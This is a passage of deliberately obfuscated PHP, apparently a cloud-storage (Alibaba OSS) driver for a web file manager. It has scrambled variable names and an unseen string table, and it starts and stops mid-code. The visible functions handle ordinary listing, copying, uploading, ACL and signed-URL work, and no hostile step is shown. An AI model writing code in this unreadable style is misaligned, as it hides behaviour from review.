$¦´ù›ËÜ = $ñ˜ĞÕŠ½ = array(); while (!0) { check_abort(); $©‡ïêÙß = array($ÙÒ¬Û[1408] => $ÜÉ¯À¦, $ÙÒ¬Û[1409] => $Š‹×‘°¶, $ÙÒ¬Û[1410] => $ìò‹¦Áì, $ÙÒ¬Û[1411] => $¡ÊÀÇÎ ); try { $ä»âóÓ = $this->client->listObjects($this->bucket, $©‡ïêÙß); } catch (OSS\Core\OssException $°ÃÈÊÄù) { break; } $¡ÊÀÇÎ  = $ä»âóÓ->getNextMarker(); $Âî­ûÊû = $ä»âóÓ->getObjectList(); $†¼õŸÌ¡ = $ä»âóÓ->getPrefixList(); foreach ($Âî­ûÊû as $ûÄ‚÷Å®) { if ($ûÄ‚÷Å®->getKey() == $Š‹×‘°¶) { continue; } $À°ÖÑ½Ó = $ûÄ‚÷Å®->getKey(); $¦«ÒÍ®í = $ûÄ‚÷Å®->getSize(); $Å³ìö = $ûÄ‚÷Å®->getLastModified(); $ùÚäŠŠ = trim($ûÄ‚÷Å®->getETag(), $ÙÒ¬Û[118]); $”İ°¢œù = $Á‰»±‘ë ? array($ÙÒ¬Û[32] => $À°ÖÑ½Ó, $ÙÒ¬Û[76] => $¦«ÒÍ®í, $ÙÒ¬Û[193] => strtotime($Å³ìö), $ÙÒ¬Û[1412] => $ùÚäŠŠ) : $À°ÖÑ½Ó; $»‹§ŞĞß = $¦«ÒÍ®í == 0 && substr($À°ÖÑ½Ó, strlen($À°ÖÑ½Ó) - 1, 1) == $ÙÒ¬Û[8] ? !0 : !1; $ºŒóñ·¡ = array($ÙÒ¬Û[76] => $¦«ÒÍ®í, $ÙÒ¬Û[1413] => $¦«ÒÍ®í, $ÙÒ¬Û[85] => strtotime($Å³ìö), $ÙÒ¬Û[1414] => $Å³ìö, $ÙÒ¬Û[1412] => $ùÚäŠŠ); $this->cacheMethodInfoSet($À°ÖÑ½Ó, $»‹§ŞĞß, $ºŒóñ·¡); if ($»‹§ŞĞß) { $¦´ù›ËÜ[] = $À°ÖÑ½Ó; continue; } $ñ˜ĞÕŠ½[] = $”İ°¢œù; } foreach ($†¼õŸÌ¡ as $–šàñ’ô) { $¦´ù›ËÜ[] = $–šàñ’ô->getPrefix(); $this->cacheMethodInfoSet($–šàñ’ô->getPrefix(), !0); } if ($¡ÊÀÇÎ  === $ÙÒ¬Û[12]) { break; } } $this->cacheMethodInfoSet($óõí²øÈ, !0); return array($ÙÒ¬Û[82] => $¦´ù›ËÜ, $ÙÒ¬Û[83] => $ñ˜ĞÕŠ½); } public function copyFile($ß´˜ı¢™, $¡¶øµ¶‡) { $ƒĞË‹î× = $this->size($ß´˜ı¢™); if ($ƒĞË‹î× < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ß´˜ı¢™, $this->bucket, $this->pathEncode($¡¶øµ¶‡)); } catch (OSS\Core\OssException $Î¹ÕåšÓ) { return !1; } return $this->getPathOuter($¡¶øµ¶‡); } $¯§ª¨¼ = $this->multiCopyObject($ß´˜ı¢™, $¡¶øµ¶‡, $ƒĞË‹î×); return $¯§ª¨¼ ? $this->getPathOuter($¡¶øµ¶‡) : !1; } private function multiCopyObject($’Ğ î¹Î, $šÕ§İÊ, $³¢«ËŠı) { $ùï¤¤¿ =& $_SERVER[”ôÑ§ì¸]; try { $¼¿Ò¶Œ™ = array(); if ($³Ú°éÖµ = $this->hashMd5($’Ğ î¹Î)) { $¼¿Ò¶Œ™ = array(OSS\OssClient::OSS_HEADERS => array($ùï¤¤¿[1415] => $³Ú°éÖµ)); } $–¸Ï—¬é = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($šÕ§İÊ), $¼¿Ò¶Œ™); $òòÃâª¿ = 1; $æñï¦ï = 0; $„¡Ä­ü = array(); $­ê‡çæ = 1024 * 1024 * 10; $¯Ğà†—î = $this->client->generateMultiuploadParts($³¢«ËŠı, $­ê‡çæ); foreach ($¯Ğà†—î as $Ñ‹ŞĞú— => $•ªã¦æ³) { $ÔãÄ‘Âó = $æñï¦ï + (int) $•ªã¦æ³[$ùï¤¤¿[1416]]; $ òÍõ² = (int) $•ªã¦æ³[$ùï¤¤¿[380]] + $ÔãÄ‘Âó - 1; $…è‹ÎÒŸ = array($ùï¤¤¿[1417] => $ÔãÄ‘Âó, $ùï¤¤¿[1418] => $ òÍõ²); $„¡Ä­ü[] = $this->client->uploadPartCopy($this->bucket, $’Ğ î¹Î, $this->bucket, $this->pathEncode($šÕ§İÊ), $òòÃâª¿, $–¸Ï—¬é, $…è‹ÎÒŸ); $òòÃâª¿ = $òòÃâª¿ + 1; } $Â…Ÿ‰Óñ = array(); foreach ($„¡Ä­ü as $Ñ‹ŞĞú— => $¡Ê–¹®•) { $Â…Ÿ‰Óñ[] = array($ùï¤¤¿[1419] => $Ñ‹ŞĞú— + 1, $ùï¤¤¿[1420] => $¡Ê–¹®•); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($šÕ§İÊ), $–¸Ï—¬é, $Â…Ÿ‰Óñ); } catch (OSS\Core\OssException $“«¶íá‡) { return !1; } return !0; } public function moveFile($•¼¼óã“, $ªŒüŠã) { if ($this->copyFile($•¼¼óã“, $ªŒüŠã)) { $this->remove($•¼¼óã“); return $this->getPathOuter($ªŒüŠã); } return !1; } public function delFile($äá–û´ñ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($äá–û´ñ)); } catch (OSS\Core\OssException $³­ĞÓÖ) { return !1; } return !0; } public function delFolder($ğÉù•Ÿ¼) { $‹ÓôŸ„Ì =& $_SERVER[”ôÑ§ì¸]; if (!$this->exist($ğÉù•Ÿ¼)) { return !0; } $this->listItemCache = !1; $Š¤êĞÍ = $this->fileList($ğÉù•Ÿ¼); $this->listItemCache = !0; $²®ù—ş = trim($ğÉù•Ÿ¼, $‹ÓôŸ„Ì[8]) . $‹ÓôŸ„Ì[8]; if (!empty($ğÉù•Ÿ¼) && $ğÉù•Ÿ¼ !== $‹ÓôŸ„Ì[211] && !in_array($²®ù—ş, $Š¤êĞÍ[$‹ÓôŸ„Ì[82]])) { $Š¤êĞÍ[$‹ÓôŸ„Ì[82]][] = $²®ù—ş; } $¬ÀşßÌŸ = $this->delByBatch($Š¤êĞÍ[$‹ÓôŸ„Ì[83]]); if (!$¬ÀşßÌŸ) { return !1; } $¬ÀşßÌŸ = $this->delByBatch($Š¤êĞÍ[$‹ÓôŸ„Ì[82]]); if (!$¬ÀşßÌŸ) { return !1; } return $this->delFile($²®ù—ş); } private function delByBatch($Ô‘ñõ) { foreach (array_chunk($Ô‘ñõ, 1000) as $§ï´ Ÿ) { try { $this->client->deleteObjects($this->bucket, $§ï´ Ÿ); } catch (OSS\Core\OssException $æ Ôí°) { return !1; } } return !0; } public function rename($ÊË‡İ‚, $¢İš¹Â–) { return $this->renameObject($ÊË‡İ‚, $¢İš¹Â–); } private function fileInfo($öœò’íó, $ÑäŠ‚ ü = false, $«ğè„†æ = array()) { $Ï’ì¤Å =& $_SERVER[”ôÑ§ì¸]; $ÌÄÙ•ÅÓ = array($Ï’ì¤Å[32] => $this->pathThis($öœò’íó), $Ï’ì¤Å[84] => $this->getPathOuter($öœò’íó), $Ï’ì¤Å[33] => $Ï’ì¤Å[213], $Ï’ì¤Å[76] => isset($«ğè„†æ[$Ï’ì¤Å[76]]) ? $«ğè„†æ[$Ï’ì¤Å[76]] : 0, $Ï’ì¤Å[174] => $this->ext($öœò’íó)); if ($ÑäŠ‚ ü) { return $ÌÄÙ•ÅÓ; } $ÌÄÙ•ÅÓ[$Ï’ì¤Å[214]] = $ÌÄÙ•ÅÓ[$Ï’ì¤Å[85]] = 0; $ÌÄÙ•ÅÓ[$Ï’ì¤Å[215]] = $ÌÄÙ•ÅÓ[$Ï’ì¤Å[216]] = !0; if (empty($«ğè„†æ)) { $ É£ƒÉÍ = $this->objectMeta($öœò’íó); if (!$ É£ƒÉÍ) { return $ÌÄÙ•ÅÓ; } $«ğè„†æ = array($Ï’ì¤Å[85] => strtotime($ É£ƒÉÍ[$Ï’ì¤Å[1414]]), $Ï’ì¤Å[76] => $ É£ƒÉÍ[$Ï’ì¤Å[1413]] + 0, $Ï’ì¤Å[1412] => $ É£ƒÉÍ[$Ï’ì¤Å[1412]]); } if (isset($«ğè„†æ[$Ï’ì¤Å[1412]]) && $«ğè„†æ[$Ï’ì¤Å[1412]]) { $ÌÄÙ•ÅÓ[$Ï’ì¤Å[218]] = $«ğè„†æ[$Ï’ì¤Å[1412]]; } if (isset($«ğè„†æ[$Ï’ì¤Å[76]])) { $ÌÄÙ•ÅÓ[$Ï’ì¤Å[76]] = $«ğè„†æ[$Ï’ì¤Å[76]]; } if (isset($«ğè„†æ[$Ï’ì¤Å[85]])) { $ÌÄÙ•ÅÓ[$Ï’ì¤Å[85]] = $«ğè„†æ[$Ï’ì¤Å[85]]; } if (isset($«ğè„†æ[$Ï’ì¤Å[193]]) && !trim($ÌÄÙ•ÅÓ[$Ï’ì¤Å[85]])) { $ÌÄÙ•ÅÓ[$Ï’ì¤Å[85]] = $«ğè„†æ[$Ï’ì¤Å[193]]; } return $ÌÄÙ•ÅÓ; } private function folderInfo($ü´×œü, $ßÒÎæ·ş = false, $¤•š§Ñù = array()) { $—™Ê¹ =& $_SERVER[”ôÑ§ì¸]; $¨İæÀò· = array($—™Ê¹[32] => $this->pathThis($ü´×œü), $—™Ê¹[84] => $this->getPathOuter($—™Ê¹[8] . $ü´×œü), $—™Ê¹[33] => $—™Ê¹[75]); if ($ßÒÎæ·ş) { return $¨İæÀò·; } $¨İæÀò·[$—™Ê¹[214]] = $¨İæÀò·[$—™Ê¹[85]] = 0; $¨İæÀò·[$—™Ê¹[215]] = $¨İæÀò·[$—™Ê¹[216]] = !0; if (empty($¤•š§Ñù)) { $ü´×œü = rtrim($ü´×œü, $—™Ê¹[8]) . $—™Ê¹[8]; $Ó¢†ÌøÒ = $this->objectMeta($ü´×œü); if (!$Ó¢†ÌøÒ) { return $¨İæÀò·; } $¤•š§Ñù = array($—™Ê¹[214] => $Ó¢†ÌøÒ[$—™Ê¹[543]][$—™Ê¹[1421]], $—™Ê¹[85] => strtotime($Ó¢†ÌøÒ[$—™Ê¹[1414]])); } if (isset($¤•š§Ñù[$—™Ê¹[85]])) { $¨İæÀò·[$—™Ê¹[85]] = $¤•š§Ñù[$—™Ê¹[85]]; } if (isset($¤•š§Ñù[$—™Ê¹[214]])) { $¨İæÀò·[$—™Ê¹[214]] = $¤•š§Ñù[$—™Ê¹[214]]; } return $¨İæÀò·; } public function listPath($ˆ‰»õ‹ö, $»Ë°±Ï = false) { $‰´ûËêÇ =& $_SERVER[”ôÑ§ì¸]; $ê»±óÒ“ = $this->fileList($ˆ‰»õ‹ö, $‰´ûËêÇ[8], !0); foreach ($ê»±óÒ“[$‰´ûËêÇ[82]] as $èÎê‚‘ => $ƒë¢ØºÖ) { $ê»±óÒ“[$‰´ûËêÇ[82]][$èÎê‚‘] = $this->folderInfo($ƒë¢ØºÖ, $»Ë°±Ï, $ƒë¢ØºÖ); } foreach ($ê»±óÒ“[$‰´ûËêÇ[83]] as $èÎê‚‘ => $ƒë¢ØºÖ) { $ê»±óÒ“[$‰´ûËêÇ[83]][$èÎê‚‘] = $this->fileInfo($ƒë¢ØºÖ[$‰´ûËêÇ[32]], $»Ë°±Ï, $ƒë¢ØºÖ); } return $ê»±óÒ“; } protected function infoChildren($ıÓ»Æˆó, &$ôŒÏİùæ) { $Í×ííäŒ =& $_SERVER[”ôÑ§ì¸]; $Šì»ñÈ = $this->fileList($ıÓ»Æˆó, $Í×ííäŒ[12], !0); $ôŒÏİùæ[$Í×ííäŒ[78]] += count($Šì»ñÈ[$Í×ííäŒ[82]]); $ôŒÏİùæ[$Í×ííäŒ[77]] += count($Šì»ñÈ[$Í×ííäŒ[83]]); foreach ($Šì»ñÈ[$Í×ííäŒ[83]] as $Õû‘ı‰ç) { if (!$Õû‘ı‰ç || !$Õû‘ı‰ç[$Í×ííäŒ[76]]) { continue; } $ôŒÏİùæ[$Í×ííäŒ[76]] += $Õû‘ı‰ç[$Í×ííäŒ[76]]; } } public function has($™†‚–×û, $£ú³Š™Ê = false, $‚˜¹¨½ = true) { $à³æˆ©¥ =& $_SERVER[”ôÑ§ì¸]; $™†‚–×û = trim($™†‚–×û, $à³æˆ©¥[8]); $¡÷úÃ = empty($™†‚–×û) && $™†‚–×û !== $à³æˆ©¥[211] ? $à³æˆ©¥[12] : $™†‚–×û . $à³æˆ©¥[8]; $ß…€ÅåŞ = $à³æˆ©¥[12]; $Øôáâê¸ = 500; $ŞğÖÌÍ = $ú‰¢íöÒ = 0; while (!0) { check_abort(); $ıÉîÓ˜Ñ = array($à³æˆ©¥[1408] => $à³æˆ©¥[8], $à³æˆ©¥[1409] => $¡÷úÃ, $à³æˆ©¥[1410] => $Øôáâê¸, $à³æˆ©¥[1411] => $ß…€ÅåŞ); try { $¸¦íÏ× = $this->client->listObjects($this->bucket, $ıÉîÓ˜Ñ); } catch (OSS\Core\OssException $™³“ªè”) { break; } $ß…€ÅåŞ = $¸¦íÏ×->getNextMarker(); $˜åû†ÑÉ = $¸¦íÏ×->getObjectList(); $²¯ÙÍ¹ = $¸¦íÏ×->getPrefixList(); if ($£ú³Š™Ê) { if (count($˜åû†ÑÉ) > 1 || count($˜åû†ÑÉ) == 1 && $˜åû†ÑÉ[0]->getKey() != $¡÷úÃ) { $ŞğÖÌÍ += count($˜åû†ÑÉ) - 1; } if (!empty($²¯ÙÍ¹)) { $ú‰¢íöÒ += count($²¯ÙÍ¹); } if ($ß…€ÅåŞ === $à³æˆ©¥[12]) { break; } continue; } if ($‚˜¹¨½) { if (!empty($˜åû†ÑÉ)) { if (count($˜åû†ÑÉ) > 1 || $˜åû†ÑÉ[0]->getKey() != $¡÷úÃ) { return !0; } } } else { if (!empty($²¯ÙÍ¹)) { return !0; } } if ($ß…€ÅåŞ === $à³æˆ©¥[12]) { break; } } if ($£ú³Š™Ê) { return array($à³æˆ©¥[222] => $ŞğÖÌÍ, $à³æˆ©¥[223] => $ú‰¢íöÒ); } return !1; } public function listAll($Ëà¾·Ø©) { $ÅÇŞ½–ı =& $_SERVER[”ôÑ§ì¸]; $û»ËÙ• = $this->fileList($Ëà¾·Ø©, $ÅÇŞ½–ı[12], !0); $º¢¹È¯ = array_to_keyvalue($û»ËÙ•[$ÅÇŞ½–ı[83]], $ÅÇŞ½–ı[32]); foreach ($û»ËÙ•[$ÅÇŞ½–ı[82]] as $°ó°Ê•) { if (is_string($°ó°Ê•)) { $º¢¹È¯[$°ó°Ê•] = array($ÅÇŞ½–ı[76] => 0); } } return $this->listAllFiles($Ëà¾·Ø©, $º¢¹È¯); } public function canRead($ºàÆş¥Â) { $óı¸äø´ =& $_SERVER[”ôÑ§ì¸]; $ù¡ú†îÄ = $this->pathAcl($ºàÆş¥Â); return $ù¡ú†îÄ == $óı¸äø´[1422] || $ù¡ú†îÄ == $óı¸äø´[586] ? !0 : !1; } public function canWrite($ÌÊå§Ï¹) { $Óïî£Ê´ = $this->pathAcl($ÌÊå§Ï¹); return $Óïî£Ê´ == $_SERVER[”ôÑ§ì¸][586] ? !0 : !1; } public function pathAcl($ÓÈŒš¿Ì) { $¨¾â£ªş =& $_SERVER[”ôÑ§ì¸]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ä³Ùô’ß = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÓÈŒš¿Ì)); } catch (OSS\Core\OssException $€Ô×é†) { return !1; } $ƒßšÄœ  = $ä³Ùô’ß == $¨¾â£ªş[37] ? $this->bucketAcl : $ä³Ùô’ß; if ($ƒßšÄœ  == $¨¾â£ªş[1423]) { return $¨¾â£ªş[1422]; } if ($ƒßšÄœ  == $¨¾â£ªş[1424]) { return $¨¾â£ªş[586]; } return $ƒßšÄœ ; } private function chmodPath($Õ’Ššà£, $ÖåÁ·Ãé = '') { $´ıÖş‰° =& $_SERVER[”ôÑ§ì¸]; $£ºíù¸ = empty($ÖåÁ·Ãé) ? $´ıÖş‰°[1424] : $ÖåÁ·Ãé; $Íà¥‚™ş = array($´ıÖş‰°[37], $´ıÖş‰°[212], $´ıÖş‰°[1423], $´ıÖş‰°[1424]); if (!in_array($£ºíù¸, $Íà¥‚™ş)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Õ’Ššà£), $£ºíù¸); } catch (OSS\Core\OssException $´®ÏÔˆÊ) { return !1; } return !0; } public function getContent($³ôè…¥) { return $this->fileSubstr($³ôè…¥, -1); } public function setContent($»ŒÉŸÏï, $Ø¯öÎ» = '') { $ª š× =& $_SERVER[”ôÑ§ì¸]; try { $Æ²ßËª· = $this->trafficLimit($ª š×[1425]); $¢¶©¿¨û = $this->client->putObject($this->bucket, $this->pathEncode($»ŒÉŸÏï), $Ø¯öÎ», $Æ²ßËª·); } catch (OSS\Core\OssException $ŸÆß·Œ ) { return !1; } $ïË’Äƒğ = array($ª š×[1415] => trim($¢¶©¿¨û[$ª š×[1412]], $ª š×[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($»ŒÉŸÏï))); $this->updateObjMeta($»ŒÉŸÏï, $ïË’Äƒğ); return isset($¢¶©¿¨û[$ª š×[1426]][$ª š×[274]]) ? !0 : !1; } private function updateObjMeta($˜–Ú„×ö, $À‘Êì÷ê) { $˜–Ú„×ö = $this->pathEncode($˜–Ú„×ö); try { $Û Åãˆ× = array(OSS\OssClient::OSS_HEADERS => $À‘Êì÷ê); $this->client->copyObject($this->bucket, $˜–Ú„×ö, $this->bucket, $˜–Ú„×ö, $Û Åãˆ×); } catch (OSS\Core\OssException $¬Ÿ²é ¨) { return !1; } return !0; } public function upload($ƒ¢Öï¥„, $³Ùº¬£ü, $Ü€ÚÁó™ = false, $İˆú©Üû = REPEAT_REPLACE) { $¸ô¬·‰Ç =& $_SERVER[”ôÑ§ì¸]; $é“Á“— = trim($ƒ¢Öï¥„, $¸ô¬·‰Ç[8]); $ğ“Óõ¡ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¸ô¬·‰Ç[1415] => @md5_file($³Ùº¬£ü)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ƒ¢Öï¥„))); $ğ“Óõ¡ = $this->trafficLimit($¸ô¬·‰Ç[1425], $ğ“Óõ¡); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($é“Á“—), $³Ùº¬£ü, $ğ“Óõ¡); } catch (OSS\Core\OssException $ÁÑÕÙ›Ü) { return !1; } return $this->getPathOuter($ƒ¢Öï¥„); } public function getHost() { $ıƒı ú— =& $_SERVER[”ôÑ§ì¸]; $Èû„Î¨Ó = explode($ıƒı ú—[197], parent::getHost()); return $Èû„Î¨Ó[0] . $ıƒı ú—[197] . $this->bucket . $ıƒı ú—[10] . $Èû„Î¨Ó[1]; } public function uploadFormData($äİËÑÏÖ, $Ìª¸·Õì = 3600) { $úİˆÎÂ =& $_SERVER[”ôÑ§ì¸]; if (!($©Ñ¤ëŒÓ = $this->getHost())) { return !1; } $ÎåĞ¥Ş = $Ìª¸·Õì; $ÊŸ±öó¸ = date($úİˆÎÂ[1427], time() + $ÎåĞ¥Ş); $”åü©¥¥ = new DateTime($ÊŸ±öó¸); $ô£¿ßö× = $”åü©¥¥->format(DateTime::ISO8601); $–çšç¢ = strpos($ô£¿ßö×, $úİˆÎÂ[339]); $ô£¿ßö× = substr($ô£¿ßö×, 0, $–çšç¢) . $úİˆÎÂ[1428]; $ñ•™ÊÃú = 1048576000 * 5; $Ğ…¬–Ï = $this->pathFather($äİËÑÏÖ); $ºëËéê× = array($úİˆÎÂ[257] => $ô£¿ßö×, $úİˆÎÂ[260] => array(array($úİˆÎÂ[1429], 0, $ñ•™ÊÃú), array($úİˆÎÂ[263], $úİˆÎÂ[264], $Ğ…¬–Ï))); $¦ÄšÜ = base64_encode(json_encode($ºëËéê×)); $éêÅ‡åø = base64_encode(hash_hmac($úİˆÎÂ[246], $¦ÄšÜ, $this->secret, !0)); $ ŠÉ¡ = array($úİˆÎÂ[275] => $¦ÄšÜ, $úİˆÎÂ[1430] => $this->accessKey, $úİˆÎÂ[267] => $úİˆÎÂ[256], $úİˆÎÂ[1431] => $éêÅ‡åø, $úİˆÎÂ[195] => $©Ñ¤ëŒÓ); $ ŠÉ¡ = $this->trafficLimit($úİˆÎÂ[1425], $ ŠÉ¡); return $ ŠÉ¡; } public function multiUploadFormData($¸Ùñ•Ê•, $ ¼ğ‹Ñ = 3600) { $¿…şÖéÁ =& $_SERVER[”ôÑ§ì¸]; if (!($Îµå´©‡ = $this->getHost())) { return !1; } $´¡½Ü‡è = $this->trafficLimit($¿…şÖéÁ[1425]); $÷Õ®°ˆë = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¸Ùñ•Ê•), $´¡½Ü‡è); return array($¿…şÖéÁ[237] => $÷Õ®°ˆë, $¿…şÖéÁ[195] => $Îµå´©‡ . $¿…şÖéÁ[8] . $this->pathEncode($¸Ùñ•Ê•), $¿…şÖéÁ[238] => gmdate($¿…şÖéÁ[1432]), $¿…şÖéÁ[94] => $¸Ùñ•Ê•); } public function multiUploadAuthData($€–ìä¬ì, $´‰¬ìŸë = array()) { $½”®â—ì =& $_SERVER[”ôÑ§ì¸]; $ì†±×® = isset($´‰¬ìŸë[$½”®â—ì[238]]) ? $´‰¬ìŸë[$½”®â—ì[238]] : gmdate($½”®â—ì[1432]); $›—‚•± = isset($´‰¬ìŸë[$½”®â—ì[174]]) ? $´‰¬ìŸë[$½”®â—ì[174]] : $½”®â—ì[12]; $œ€‚İáú = $€–ìä¬ì; if (isset($´‰¬ìŸë[$½”®â—ì[94]])) { $œ€‚İáú = $´‰¬ìŸë[$½”®â—ì[94]]; unset($´‰¬ìŸë[$½”®â—ì[94]]); } if (isset($´‰¬ìŸë[$½”®â—ì[239]])) { $´‰¬ìŸë[$½”®â—ì[238]] = $ì†±×®; return $this->listUploadParts($œ€‚İáú, $´‰¬ìŸë); } $Ù‘½ùòÉ = array($½”®â—ì[240], $½”®â—ì[12], $½”®â—ì[120], $ì†±×®, "\170\55\x6f\163\x73\55\144\141\164\x65\72{$ì†±×®}", $½”®â—ì[8] . $this->bucket . $½”®â—ì[8] . $œ€‚İáú . $›—‚•±); if (strpos($›—‚•±, $½”®â—ì[241]) === 0) { $Ù‘½ùòÉ[0] = $½”®â—ì[242]; if ($³³‹ÒÁú = $this->trafficLimit($½”®â—ì[1425])) { $œ€‚İáú = $½”®â—ì[1433]; array_splice($Ù‘½ùòÉ, 5, 0, $œ€‚İáú . $½”®â—ì[4] . $³³‹ÒÁú[$œ€‚İáú]); } } if (isset($´‰¬ìŸë[$½”®â—ì[243]]) && $´‰¬ìŸë[$½”®â—ì[243]] == $½”®â—ì[244]) { $Ù‘½ùòÉ[0] = $½”®â—ì[244]; } if (!empty($´‰¬ìŸë[$½”®â—ì[1434]])) { $ßÆ’˜Û· = array_merge(array($Ù‘½ùòÉ[4]), $´‰¬ìŸë[$½”®â—ì[1434]]); sort($ßÆ’˜Û·); $Ù‘½ùòÉ[4] = implode($½”®â—ì[245], $ßÆ’˜Û·); } $¾’®À¿‰ = implode($½”®â—ì[245], $Ù‘½ùòÉ); $Œ™¹ëàî = base64_encode(hash_hmac($½”®â—ì[246], $¾’®À¿‰, $this->secret, !0)); $Ï³íıÁ = $½”®â—ì[1398] . $this->accessKey . $½”®â—ì[4] . $Œ™¹ëàî; if (strpos($›—‚•±, $½”®â—ì[241]) === 0) { $Ï³íıÁ = array($½”®â—ì[248] => $Ï³íıÁ, $½”®â—ì[238] => $ì†±×®); if ($³³‹ÒÁú) { $Ï³íıÁ = array_merge($Ï³íıÁ, $³³‹ÒÁú); } } return $Ï³íıÁ; } public function listUploadParts($«‰’¶ÉÌ, $ù±‹¼ùÓ) { $íÁÉ¢¸º =& $_SERVER[”ôÑ§ì¸]; $œ„ÇÈùÃ = parse_url_query($ù±‹¼ùÓ[$íÁÉ¢¸º[174]]); $»©Ôà¥¢ = $this->client->listParts($this->bucket, $this->pathEncode($«‰’¶ÉÌ), $œ„ÇÈùÃ[$íÁÉ¢¸º[237]]); $Ç‹äÃ™ = $»©Ôà¥¢->getListPart(); $—®ÔÔÅÙ = array(); foreach ($Ç‹äÃ™ as $öŒŞç´û) { $—®ÔÔÅÙ[] = array($íÁÉ¢¸º[1419] => $öŒŞç´û->getPartNumber(), $íÁÉ¢¸º[1420] => trim($öŒŞç´û->getETag(), $íÁÉ¢¸º[118])); } unset($ù±‹¼ùÓ[$íÁÉ¢¸º[239]], $ù±‹¼ùÓ[$íÁÉ¢¸º[243]]); $øÏÄ¹Ü = $this->multiUploadAuthData($«‰’¶ÉÌ, $ù±‹¼ùÓ); if (empty($øÏÄ¹Ü)) { return !1; } return array($íÁÉ¢¸º[248] => $øÏÄ¹Ü, $íÁÉ¢¸º[238] => $ù±‹¼ùÓ[$íÁÉ¢¸º[238]], $íÁÉ¢¸º[250] => $—®ÔÔÅÙ); } public function download($Ğ†Ã¶ØÖ, $­øûÂÍÛ) { if ($this->isFolder($Ğ†Ã¶ØÖ)) { return !1; } try { $»¤Ë–‰ø = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $­øûÂÍÛ); $»¤Ë–‰ø = $this->trafficLimit($_SERVER[”ôÑ§ì¸][109], $»¤Ë–‰ø); $this->client->getObject($this->bucket, $this->pathEncode($Ğ†Ã¶ØÖ), $»¤Ë–‰ø); } catch (OSS\Core\OssException $ÉşßÅÑÄ) { return !1; } return $­øûÂÍÛ; } public function fileSubstr($·›Ë¯½‘, $Ùİ¿ÓŞ = 0, $‡äƒ÷ÉÃ = false) { if ($Ùİ¿ÓŞ === -1) { $å»úèˆª = array(); } else { if ($‡äƒ÷ÉÃ === !1) { $¡Ó“Ìğ­ = $this->size($·›Ë¯½‘); } else { $¡Ó“Ìğ­ = $Ùİ¿ÓŞ + $‡äƒ÷ÉÃ - 1; } $å»úèˆª = array(OSS\OssClient::OSS_RANGE => "{$Ùİ¿ÓŞ}\55{$¡Ó“Ìğ­}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($·›Ë¯½‘), $å»úèˆª); } catch (OSS\Core\OssException $…€ß¿û) { think_exception($…€ß¿û->getMessage()); return !1; } } private function trafficLimit($°ïŸÈğü, $š£¬Ü¹İ = array()) { $—ÜÄêÅ =& $_SERVER[”ôÑ§ì¸]; if ($°ïŸÈğü == $—ÜÄêÅ[1425] && $this->isUploadServer() || $°ïŸÈğü == $—ÜÄêÅ[109] && $this->isFileOutServer()) { return $š£¬Ü¹İ; } $Ì–Î‘€ = floatval($GLOBALS[$—ÜÄêÅ[6]][$—ÜÄêÅ[89]][$—ÜÄêÅ[107]][$°ïŸÈğü]) * 1024 * 1024 * 8; if (!$Ì–Î‘€) { return $š£¬Ü¹İ; } $Ì–Î‘€ = $Ì–Î‘€ < 819200 ? 819200 : ($Ì–Î‘€ > 838860800 ? 838860800 : $Ì–Î‘€); $š£¬Ü¹İ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ì–Î‘€); return $š£¬Ü¹İ; } public function link($Õíº¶Ò, $ï¸¡ãö = array()) { $ñè‘‘ÚÙ =& $_SERVER[”ôÑ§ì¸]; if (!$this->exist($Õíº¶Ò) || $this->isFolder($Õíº¶Ò)) { return !1; } try { $ï¸¡ãö = $this->trafficLimit($ñè‘‘ÚÙ[109], $ï¸¡ãö); $…ê«šóø = $this->client->signUrl($this->bucket, $this->pathEncode($Õíº¶Ò), 3600 * 12, $ñè‘‘ÚÙ[244], $ï¸¡ãö); return $this->getCdnLink($…ê«šóø); } catch (OSS\Core\OssException $ùÈ³Ê»²) { return !1; } } public function fileOut($»ù’Å‘, $ïó¬ş€ = false, $…È˜ºÛ = false, $ö«ÌÀï‰ = '') { $º»ïƒÚ =& $_SERVER[”ôÑ§ì¸]; if ($this->isFileOutServer()) { return $this->fileOutServer($»ù’Å‘, $ïó¬ş€, $…È˜ºÛ, $ö«ÌÀï‰); } if (!$…È˜ºÛ) { $…È˜ºÛ = $this->pathThis($»ù’Å‘); } $…È˜ºÛ = rawurlencode($…È˜ºÛ); $úô²î¤Ù = get_file_mime(get_path_ext($…È˜ºÛ)); if ($úô²î¤Ù == $º»ïƒÚ[231]) { return parent::fileOut($»ù’Å‘, $ïó¬ş€, $…È˜ºÛ, $ö«ÌÀï‰); } $ïó¬ş€ = $ïó¬ş€ ? $º»ïƒÚ[1435] : $º»ïƒÚ[1436]; $ËŠ…¼â¤ = array(OSS\OssClient::OSS_SUB_RESOURCE => $º»ïƒÚ[1437] . rawurlencode("{$ïó¬ş€}\x3b\146\151\154\145\156\x61\155\x65\75{$…È˜ºÛ}")); $ËŠ…¼â¤[OSS\OssClient::OSS_SUB_RESOURCE] .= $º»ïƒÚ[1438] . rawurlencode($úô²î¤Ù); $¿ş™Ç = $this->link($»ù’Å‘, $ËŠ…¼â¤); $this->fileOutLink($¿ş™Ç); } public function fileOutServer($Û·ııßœ, $”Õ·ËÌ = false, $úşÁêä = false, $ØøÇÚ¶³ = '') { parent::fileOut($Û·ııßœ, $”Õ·ËÌ, $úşÁêä, $ØøÇÚ¶³); } public function fileOutImage($„¯ñØ÷â, $Ç¦¹„€ = 250) { if ($this->size($„¯ñØ÷â) > 1024 * 1024 * 20) { return $this->fileOutImageServer($„¯ñØ÷â, $Ç¦¹„€); } $…ú»… = array(OSS\OssClient::OSS_PROCESS => $_SERVER[”ôÑ§ì¸][1439] . $Ç¦¹„€); 